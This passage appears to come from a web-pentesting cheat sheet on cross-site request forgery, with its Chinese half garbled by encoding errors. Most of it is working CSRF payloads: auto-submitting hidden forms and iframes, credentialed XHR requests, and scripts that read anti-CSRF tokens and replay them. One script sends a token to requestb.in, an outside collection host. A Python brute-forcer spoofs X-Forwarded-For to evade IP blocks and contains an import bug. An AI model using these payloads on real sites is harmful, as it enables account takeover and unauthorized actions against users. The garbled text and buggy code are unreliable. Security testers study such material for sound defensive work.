éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå³ä½¿ä½¿ç”¨ POST æ–¹æ³•è¿›è¡Œ Ajax è¯·æ±‚ï¼Œå®ƒä»¬ä»ç„¶å¯èƒ½å®¹æ˜“å—åˆ° CSRF æ”»å‡»ï¼Œå› ä¸ºæ”»å‡»è€…ä»ç„¶å¯ä»¥è¯±ä½¿å—å®³è€…å‘èµ·è¯·æ±‚ã€‚

To prevent CSRF attacks in Ajax POST requests, it is recommended to use additional security measures, such as implementing the SameSite attribute for cookies or using anti-CSRF libraries.

ä¸ºäº†é˜²æ­¢ Ajax POST è¯·æ±‚çš„ CSRF æ”»å‡»ï¼Œå»ºè®®é‡‡å–é¢å¤–çš„å®‰å…¨æªæ–½ï¼Œæ¯”å¦‚ä¸º cookie å®ç° SameSite å±æ€§æˆ–ä½¿ç”¨å CSRF åº“ã€‚
```markup
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### multipart/form-data POST è¯·æ±‚

In a `multipart/form-data` POST request, the data is divided into multiple parts, each with its own content type and boundary. This type of request is commonly used when uploading files or submitting forms with binary data.

åœ¨ `multipart/form-data` POST è¯·æ±‚ä¸­ï¼Œæ•°æ®è¢«åˆ†æˆå¤šä¸ªéƒ¨åˆ†ï¼Œæ¯ä¸ªéƒ¨åˆ†éƒ½æœ‰è‡ªå·±çš„å†…å®¹ç±»å‹å’Œè¾¹ç•Œã€‚è¿™ç§ç±»å‹çš„è¯·æ±‚é€šå¸¸ç”¨äºä¸Šä¼ æ–‡ä»¶æˆ–æäº¤åŒ…å«äºŒè¿›åˆ¶æ•°æ®çš„è¡¨å•ã€‚

To construct a `multipart/form-data` request, you need to set the `Content-Type` header to `multipart/form-data` and include the appropriate boundaries between the parts. Each part should have a `Content-Disposition` header specifying the name and filename (if applicable) of the data.

è¦æ„é€ ä¸€ä¸ª `multipart/form-data` è¯·æ±‚ï¼Œä½ éœ€è¦å°† `Content-Type` å¤´è®¾ç½®ä¸º `multipart/form-data`ï¼Œå¹¶åœ¨å„ä¸ªéƒ¨åˆ†ä¹‹é—´åŒ…å«é€‚å½“çš„è¾¹ç•Œã€‚æ¯ä¸ªéƒ¨åˆ†åº”è¯¥æœ‰ä¸€ä¸ª `Content-Disposition` å¤´ï¼ŒæŒ‡å®šæ•°æ®çš„åç§°å’Œæ–‡ä»¶åï¼ˆå¦‚æœé€‚ç”¨ï¼‰ã€‚

Here is an example of a `multipart/form-data` POST request:

ä¸‹é¢æ˜¯ä¸€ä¸ª `multipart/form-data` POST è¯·æ±‚çš„ç¤ºä¾‹ï¼š

```http
POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=---------------------------1234567890

-----------------------------1234567890
Content-Disposition: form-data; name="file"; filename="example.txt"
Content-Type: text/plain

This is the content of the file.

-----------------------------1234567890
Content-Disposition: form-data; name="name"

John Doe
-----------------------------1234567890--
```

In this example, the request is sent to `example.com/upload` with two parts. The first part is a file named `example.txt` with the content type `text/plain`. The second part is a form field named `name` with the value `John Doe`. The boundaries (`---------------------------1234567890`) separate the parts of the request.

åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œè¯·æ±‚è¢«å‘é€åˆ° `example.com/upload`ï¼ŒåŒ…å«ä¸¤ä¸ªéƒ¨åˆ†ã€‚ç¬¬ä¸€ä¸ªéƒ¨åˆ†æ˜¯ä¸€ä¸ªåä¸º `example.txt` çš„æ–‡ä»¶ï¼Œå†…å®¹ç±»å‹ä¸º `text/plain`ã€‚ç¬¬äºŒä¸ªéƒ¨åˆ†æ˜¯ä¸€ä¸ªåä¸º `name` çš„è¡¨å•å­—æ®µï¼Œå€¼ä¸º `John Doe`ã€‚è¾¹ç•Œï¼ˆ`---------------------------1234567890`ï¼‰åˆ†éš”äº†è¯·æ±‚çš„å„ä¸ªéƒ¨åˆ†ã€‚
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### multipart/form-data POSTè¯·æ±‚ v2

In this technique, we will explore how to perform a Cross-Site Request Forgery (CSRF) attack using a multipart/form-data POST request.

#### Introduction

A multipart/form-data POST request is commonly used to upload files or submit form data that includes binary content. This type of request is typically used when interacting with web applications that have file upload functionality.

#### Exploiting CSRF with multipart/form-data POST request

To exploit CSRF using a multipart/form-data POST request, we need to create a malicious HTML page that will automatically submit the request when loaded by the victim's browser. This can be achieved by embedding a hidden form in the HTML page and using JavaScript to automatically submit the form.

The form should be configured to submit the request to the target application's vulnerable endpoint. The request should include any required parameters, such as the file to be uploaded or form data to be submitted.

When the victim visits the malicious HTML page, the hidden form will be automatically submitted, triggering the CSRF attack. The victim's browser will send the multipart/form-data POST request to the target application, potentially causing unintended actions to occur.

#### Mitigating CSRF attacks with multipart/form-data POST request

To mitigate CSRF attacks using multipart/form-data POST requests, web applications can implement the following measures:

1. Implement CSRF tokens: Web applications can generate and include unique CSRF tokens in each form submission. These tokens should be validated on the server-side to ensure that the request is legitimate.

2. Implement SameSite cookies: Setting the SameSite attribute to "Strict" or "Lax" for cookies can prevent them from being sent in cross-site requests, thereby mitigating CSRF attacks.

3. Implement Referer header validation: Web applications can validate the Referer header of incoming requests to ensure that they originate from the same domain. This can help detect and block CSRF attacks.

By implementing these measures, web applications can significantly reduce the risk of CSRF attacks through multipart/form-data POST requests.
```javascript
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### åœ¨iframeä¸­å‘é€è¡¨å•POSTè¯·æ±‚

In some cases, you may encounter a scenario where you need to send a POST request from within an iframe. This can be useful for performing Cross-Site Request Forgery (CSRF) attacks or for other testing purposes.

åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ‚¨å¯èƒ½ä¼šé‡åˆ°éœ€è¦åœ¨iframeä¸­å‘é€POSTè¯·æ±‚çš„æƒ…å†µã€‚è¿™å¯¹äºæ‰§è¡Œè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰æ”»å‡»æˆ–å…¶ä»–æµ‹è¯•ç›®çš„éå¸¸æœ‰ç”¨ã€‚

To achieve this, you can create a hidden form within the iframe and then submit it programmatically using JavaScript. Here's an example of how you can do this:

ä¸ºäº†å®ç°è¿™ä¸€ç‚¹ï¼Œæ‚¨å¯ä»¥åœ¨iframeä¸­åˆ›å»ºä¸€ä¸ªéšè—çš„è¡¨å•ï¼Œç„¶åä½¿ç”¨JavaScriptä»¥ç¼–ç¨‹æ–¹å¼æäº¤å®ƒã€‚ä»¥ä¸‹æ˜¯æ‚¨å¯ä»¥æ‰§è¡Œæ­¤æ“ä½œçš„ç¤ºä¾‹ï¼š

```html
<iframe id="myIframe" src="about:blank"></iframe>

<script>
  // Get a reference to the iframe
  var iframe = document.getElementById('myIframe');

  // Create a hidden form
  var form = document.createElement('form');
  form.style.display = 'none';
  form.method = 'POST';
  form.action = 'https://www.example.com/endpoint';

  // Add any necessary form fields
  var input1 = document.createElement('input');
  input1.type = 'hidden';
  input1.name = 'param1';
  input1.value = 'value1';
  form.appendChild(input1);

  var input2 = document.createElement('input');
  input2.type = 'hidden';
  input2.name = 'param2';
  input2.value = 'value2';
  form.appendChild(input2);

  // Append the form to the iframe's document
  iframe.contentDocument.body.appendChild(form);

  // Submit the form
  form.submit();
</script>
```

This code creates an iframe with the id "myIframe" and sets its source to "about:blank". Then, it programmatically creates a hidden form with the desired method (POST) and action (the target URL). It adds any necessary form fields as hidden inputs and appends the form to the iframe's document. Finally, it submits the form.

æ­¤ä»£ç åˆ›å»ºäº†ä¸€ä¸ªidä¸º"myIframe"çš„iframeï¼Œå¹¶å°†å…¶æºè®¾ç½®ä¸º"about:blank"ã€‚ç„¶åï¼Œå®ƒä»¥ç¼–ç¨‹æ–¹å¼åˆ›å»ºäº†ä¸€ä¸ªå…·æœ‰æ‰€éœ€æ–¹æ³•ï¼ˆPOSTï¼‰å’Œæ“ä½œï¼ˆç›®æ ‡URLï¼‰çš„éšè—è¡¨å•ã€‚å®ƒå°†ä»»ä½•å¿…è¦çš„è¡¨å•å­—æ®µä½œä¸ºéšè—è¾“å…¥æ·»åŠ ï¼Œå¹¶å°†è¡¨å•é™„åŠ åˆ°iframeçš„æ–‡æ¡£ä¸­ã€‚æœ€åï¼Œå®ƒæäº¤äº†è¡¨å•ã€‚

By using this technique, you can send a POST request from within an iframe and perform actions on behalf of the user, potentially leading to CSRF vulnerabilities. It's important to be aware of the security implications and use this technique responsibly and ethically.

é€šè¿‡ä½¿ç”¨è¿™ç§æŠ€æœ¯ï¼Œæ‚¨å¯ä»¥åœ¨iframeå†…éƒ¨å‘é€POSTè¯·æ±‚ï¼Œå¹¶ä»£è¡¨ç”¨æˆ·æ‰§è¡Œæ“ä½œï¼Œå¯èƒ½å¯¼è‡´CSRFæ¼æ´ã€‚é‡è¦çš„æ˜¯è¦æ„è¯†åˆ°å®‰å…¨å½±å“ï¼Œå¹¶è´Ÿè´£ä»»å’Œé“å¾·åœ°ä½¿ç”¨è¿™ç§æŠ€æœ¯ã€‚
```markup
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **çªƒå–CSRFä»¤ç‰Œå¹¶å‘é€POSTè¯·æ±‚**

To perform a CSRF attack, you need to steal the CSRF token from the target website and then use it to craft a malicious POST request. Here's how you can do it:

1. **Stealing the CSRF Token:**
   - If the CSRF token is stored in a cookie, you can use JavaScript to extract it from the cookie and send it to your server. You can achieve this by injecting a malicious script into a vulnerable page or by using a Man-in-the-Middle (MitM) attack to intercept the token.
   - If the CSRF token is embedded in a form or a URL parameter, you can extract it using JavaScript or by analyzing the source code of the target page.

2. **Crafting the Malicious POST Request:**
   - Once you have the CSRF token, you can use it to craft a POST request with the desired payload. Make sure to include the CSRF token in the request headers or body, depending on how the target website expects it.
   - The payload of the POST request can contain any malicious action you want to perform on behalf of the victim user. For example, you can change their password, make a purchase, or perform any other action that the target website allows.

3. **Sending the POST Request:**
   - To send the POST request, you can use various tools like cURL, Python requests library, or browser extensions like Postman or Burp Suite.
   - Make sure to set the appropriate headers and parameters in the request to mimic a legitimate request from the victim user.
   - Once the request is sent, the target website will process it as if it came from the victim user, potentially leading to unauthorized actions or data leakage.

Remember that CSRF attacks can have serious consequences, so always ensure that you have proper authorization before attempting such attacks.
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **çªƒå–CSRFä»¤ç‰Œå¹¶ä½¿ç”¨iframeã€è¡¨å•å’ŒAjaxå‘é€Postè¯·æ±‚**

To perform a Cross-Site Request Forgery (CSRF) attack, you need to steal the CSRF token from the target website and then use it to send a malicious POST request. This can be achieved using an iframe, a form, or Ajax.

#### **Stealing the CSRF Token**

1. **Using an iframe**: You can create an invisible iframe that loads the target website's page containing the CSRF token. By accessing the iframe's content, you can extract the CSRF token and store it in a variable.

```html
<iframe id="csrfFrame" src="https://target-website.com/page-with-csrf-token"></iframe>
<script>
    var csrfToken = document.getElementById('csrfFrame').contentDocument.getElementById('csrfToken').value;
    // Store the CSRF token in a variable for later use
</script>
```

2. **Using a form**: Another method is to create a hidden form that submits a GET request to the target website's page containing the CSRF token. By parsing the response, you can extract the CSRF token and store it in a variable.

```html
<form id="csrfForm" action="https://target-website.com/page-with-csrf-token" method="GET">
    <input type="hidden" name="csrfToken" value="">
</form>
<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://target-website.com/page-with-csrf-token', true);
    xhr.onload = function() {
        var parser = new DOMParser();
        var responseDoc = parser.parseFromString(xhr.responseText, 'text/html');
        var csrfToken = responseDoc.getElementById('csrfToken').value;
        // Store the CSRF token in a variable for later use
    };
    xhr.send();
</script>
```

#### **Sending a POST Request**

Once you have obtained the CSRF token, you can use it to craft a malicious POST request and send it to the target website. This can be done using an iframe, a form, or Ajax.

1. **Using an iframe**: Create a hidden iframe and set its source to the target website's endpoint that accepts the POST request. Include the stolen CSRF token as a parameter in the request.

```html
<iframe id="postFrame" style="display:none;"></iframe>
<script>
    var postFrame = document.getElementById('postFrame');
    postFrame.src = 'https://target-website.com/post-endpoint?csrfToken=' + csrfToken;
</script>
```

2. **Using a form**: Create a hidden form and set its action to the target website's endpoint that accepts the POST request. Include the stolen CSRF token as a hidden input field in the form.

```html
<form id="postForm" action="https://target-website.com/post-endpoint" method="POST">
    <input type="hidden" name="csrfToken" value="csrfToken">
</form>
<script>
    var postForm = document.getElementById('postForm');
    postForm.submit();
</script>
```

3. **Using Ajax**: Use JavaScript to send a POST request to the target website's endpoint. Include the stolen CSRF token as a parameter in the request.

```html
<script>
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://target-website.com/post-endpoint', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send('csrfToken=' + csrfToken);
</script>
```

By stealing the CSRF token and sending a malicious POST request, you can exploit the vulnerability of the target website and perform unauthorized actions on behalf of the victim user.
```markup
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **çªƒå–CSRFä»¤ç‰Œå¹¶ä½¿ç”¨iframeå’Œè¡¨å•å‘é€POSTè¯·æ±‚**

One way to exploit Cross-Site Request Forgery (CSRF) vulnerabilities is by stealing the CSRF token and sending a POST request using an iframe and a form. This technique allows an attacker to trick a victim into unknowingly performing actions on a vulnerable website.

To carry out this attack, the attacker first needs to obtain the CSRF token. This token is typically stored in a cookie or as a hidden field in a form. The attacker can use various methods to steal the token, such as exploiting other vulnerabilities like XSS or by tricking the victim into visiting a malicious website.

Once the CSRF token is obtained, the attacker can create an iframe on their malicious website. The iframe's source will be set to the target website's URL, and the attacker will include a form within the iframe. The form will have the necessary fields to perform the desired action, such as transferring funds or changing account settings.

When the victim visits the attacker's website, the iframe will load the target website in the background. Since the victim is already authenticated on the target website, the browser will include the CSRF token in the request. The form within the iframe will automatically submit the request, effectively performing the action on behalf of the victim.

To prevent this type of attack, websites should implement measures such as using anti-CSRF tokens, validating the origin of requests, and implementing strict SameSite cookie policies. Additionally, users should be cautious when visiting unfamiliar websites and regularly update their browsers and security software to protect against potential vulnerabilities.
```markup
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **çªƒå–ä»¤ç‰Œå¹¶ä½¿ç”¨2ä¸ªiframeå‘é€**

One way to perform a CSRF attack is by stealing the victim's authentication token and sending it using two iframes. This attack can be executed in the following steps:

1. The attacker creates a malicious website that contains two hidden iframes.
2. The first iframe is loaded with the target website's login page.
3. The second iframe is loaded with a page on the attacker's website that contains a form.
4. The form in the second iframe is automatically submitted, targeting a vulnerable endpoint on the target website.
5. The victim visits the attacker's malicious website, which triggers the loading of the iframes.
6. The first iframe loads the target website's login page, tricking the victim into entering their credentials.
7. The second iframe submits the form, including the stolen authentication token, to the vulnerable endpoint on the target website.
8. The vulnerable endpoint processes the request, believing it to be legitimate due to the presence of the valid authentication token.
9. The attacker successfully performs actions on behalf of the victim, using their stolen token.

To prevent this type of attack, web developers should implement measures such as using anti-CSRF tokens, validating the origin of requests, and implementing strict access controls.
```markup
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **ä½¿ç”¨Ajaxçªƒå–CSRFä»¤ç‰Œå¹¶é€šè¿‡è¡¨å•å‘é€POSTè¯·æ±‚**

In this technique, we will use Ajax to steal the CSRF token from the target website and then send a POST request using a form.

åœ¨è¿™ä¸ªæŠ€æœ¯ä¸­ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨Ajaxä»ç›®æ ‡ç½‘ç«™çªƒå–CSRFä»¤ç‰Œï¼Œç„¶åä½¿ç”¨ä¸€ä¸ªè¡¨å•å‘é€POSTè¯·æ±‚ã€‚

First, we need to create an HTML form with the necessary fields for the POST request. We will include a hidden input field to store the stolen CSRF token.

é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªHTMLè¡¨å•ï¼Œå…¶ä¸­åŒ…å«ç”¨äºPOSTè¯·æ±‚çš„å¿…è¦å­—æ®µã€‚æˆ‘ä»¬å°†åŒ…å«ä¸€ä¸ªéšè—çš„è¾“å…¥å­—æ®µæ¥å­˜å‚¨çªƒå–çš„CSRFä»¤ç‰Œã€‚

```html
<form id="csrfForm" action="https://target-website.com/post-endpoint" method="POST">
  <input type="hidden" name="csrf_token" id="csrfToken" value="">
  <!-- Other form fields -->
  <input type="submit" value="Submit">
</form>
```

Next, we will use Ajax to make a GET request to the target website and extract the CSRF token from the response.

æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨Ajaxå‘ç›®æ ‡ç½‘ç«™å‘å‡ºGETè¯·æ±‚ï¼Œå¹¶ä»å“åº”ä¸­æå–CSRFä»¤ç‰Œã€‚

```javascript
$.ajax({
  url: "https://target-website.com/csrf-endpoint",
  type: "GET",
  success: function(response) {
    var csrfToken = $(response).find("#csrfToken").val();
    $("#csrfToken").val(csrfToken);
  }
});
```

In the above code, we make a GET request to the `/csrf-endpoint` of the target website and extract the value of the `#csrfToken` input field from the response. We then set the value of the hidden input field in our form to the stolen CSRF token.

åœ¨ä¸Šé¢çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬å‘ç›®æ ‡ç½‘ç«™çš„`/csrf-endpoint`å‘å‡ºGETè¯·æ±‚ï¼Œå¹¶ä»å“åº”ä¸­æå–`#csrfToken`è¾“å…¥å­—æ®µçš„å€¼ã€‚ç„¶åï¼Œæˆ‘ä»¬å°†æˆ‘ä»¬è¡¨å•ä¸­éšè—è¾“å…¥å­—æ®µçš„å€¼è®¾ç½®ä¸ºçªƒå–çš„CSRFä»¤ç‰Œã€‚

Finally, when the user submits the form, the POST request will be sent to the target website with the stolen CSRF token.

æœ€åï¼Œå½“ç”¨æˆ·æäº¤è¡¨å•æ—¶ï¼Œå°†ä½¿ç”¨çªƒå–çš„CSRFä»¤ç‰Œå°†POSTè¯·æ±‚å‘é€åˆ°ç›®æ ‡ç½‘ç«™ã€‚

Note: This technique assumes that the target website does not have any additional security measures in place to prevent CSRF attacks, such as SameSite cookies or CSRF tokens tied to specific user sessions.

æ³¨æ„ï¼šæ­¤æŠ€æœ¯å‡è®¾ç›®æ ‡ç½‘ç«™æ²¡æœ‰é‡‡å–ä»»ä½•é¢å¤–çš„å®‰å…¨æªæ–½æ¥é˜²æ­¢CSRFæ”»å‡»ï¼Œä¾‹å¦‚SameSite cookieæˆ–ä¸ç‰¹å®šç”¨æˆ·ä¼šè¯ç»‘å®šçš„CSRFä»¤ç‰Œã€‚
```markup
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### ä½¿ç”¨ Socket.IO è¿›è¡Œ CSRF æ”»å‡»

Socket.IO æ˜¯ä¸€ä¸ªç”¨äºå®æ—¶åº”ç”¨ç¨‹åºçš„ JavaScript åº“ï¼Œå®ƒå¯ä»¥åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´å»ºç«‹æŒä¹…çš„åŒå‘é€šä¿¡é€šé“ã€‚ç”±äº Socket.IO çš„ç‰¹æ€§ï¼Œå®ƒä¹Ÿå¯èƒ½å­˜åœ¨ CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰æ¼æ´ã€‚

#### CSRF æ”»å‡»åŸç†

CSRF æ”»å‡»åˆ©ç”¨äº†ç”¨æˆ·åœ¨è®¿é—®å—ä¿¡ä»»ç½‘ç«™æ—¶çš„èº«ä»½éªŒè¯å‡­æ®ã€‚æ”»å‡»è€…é€šè¿‡è¯±ä½¿å—å®³è€…è®¿é—®æ¶æ„ç½‘ç«™ï¼Œä»è€Œåœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­æ‰§è¡Œæ¶æ„æ“ä½œã€‚å½“å—å®³è€…åŒæ—¶è®¿é—®å—ä¿¡ä»»ç½‘ç«™æ—¶ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å‘é€åŒ…å«èº«ä»½éªŒè¯å‡­æ®çš„è¯·æ±‚ï¼Œä»è€Œå¯¼è‡´æ”»å‡»æˆåŠŸã€‚

#### Socket.IO ä¸­çš„ CSRF æ”»å‡»

åœ¨ Socket.IO ä¸­ï¼Œç”±äºå…¶ä½¿ç”¨äº†è‡ªå®šä¹‰çš„åè®®å’Œé•¿è¿æ¥ï¼Œä¼ ç»Ÿçš„ CSRF é˜²å¾¡æªæ–½å¯èƒ½æ— æ³•æœ‰æ•ˆé˜²æ­¢æ”»å‡»ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„è¯·æ±‚ï¼Œåˆ©ç”¨å—å®³è€…çš„èº«ä»½éªŒè¯å‡­æ®å‘é€è¯·æ±‚åˆ° Socket.IO æœåŠ¡å™¨ï¼Œä»è€Œæ‰§è¡Œæ¶æ„æ“ä½œã€‚

#### é˜²å¾¡ CSRF æ”»å‡»

ä¸ºäº†é˜²å¾¡ Socket.IO ä¸­çš„ CSRF æ”»å‡»ï¼Œå¯ä»¥é‡‡å–ä»¥ä¸‹æªæ–½ï¼š

1. ä½¿ç”¨ CSRF ä»¤ç‰Œï¼šåœ¨æ¯ä¸ª Socket.IO è¯·æ±‚ä¸­åŒ…å«ä¸€ä¸ª CSRF ä»¤ç‰Œï¼Œå¹¶åœ¨æœåŠ¡å™¨ç«¯éªŒè¯è¯¥ä»¤ç‰Œçš„æœ‰æ•ˆæ€§ã€‚è¿™æ ·å¯ä»¥ç¡®ä¿åªæœ‰åˆæ³•çš„è¯·æ±‚æ‰èƒ½è¢«å¤„ç†ã€‚

2. å¯ç”¨ SameSite Cookie å±æ€§ï¼šå°† Cookie çš„ SameSite å±æ€§è®¾ç½®ä¸º Strict æˆ– Laxï¼Œä»¥é™åˆ¶è·¨ç«™ç‚¹è¯·æ±‚ã€‚è¿™æ ·å¯ä»¥é˜²æ­¢ç¬¬ä¸‰æ–¹ç½‘ç«™åœ¨ç”¨æˆ·æµè§ˆå™¨ä¸­æ‰§è¡Œ CSRF æ”»å‡»ã€‚

3. ä½¿ç”¨åŒé‡èº«ä»½éªŒè¯ï¼šåœ¨ Socket.IO è¯·æ±‚ä¸­è¦æ±‚ç”¨æˆ·è¿›è¡ŒåŒé‡èº«ä»½éªŒè¯ï¼Œä¾‹å¦‚è¾“å…¥éªŒè¯ç æˆ–ä½¿ç”¨äºŒæ¬¡ç¡®è®¤ã€‚

é€šè¿‡é‡‡å–è¿™äº›é˜²å¾¡æªæ–½ï¼Œå¯ä»¥æœ‰æ•ˆåœ°é˜²æ­¢ Socket.IO ä¸­çš„ CSRF æ”»å‡»ï¼Œä¿æŠ¤ç”¨æˆ·çš„èº«ä»½éªŒè¯å‡­æ®å’Œæ•æ„Ÿä¿¡æ¯çš„å®‰å…¨ã€‚
```markup
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRFç™»å½•æš´åŠ›ç ´è§£

è¯¥ä»£ç å¯ä»¥ä½¿ç”¨CSRFä»¤ç‰Œå¯¹ç™»å½•è¡¨å•è¿›è¡Œæš´åŠ›ç ´è§£ï¼ˆè¿˜ä½¿ç”¨äº†X-Forwarded-Forå¤´éƒ¨æ¥å°è¯•ç»•è¿‡å¯èƒ½çš„IPé»‘åå•ï¼‰ï¼š
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## å·¥å…· <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## å‚è€ƒèµ„æ–™

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
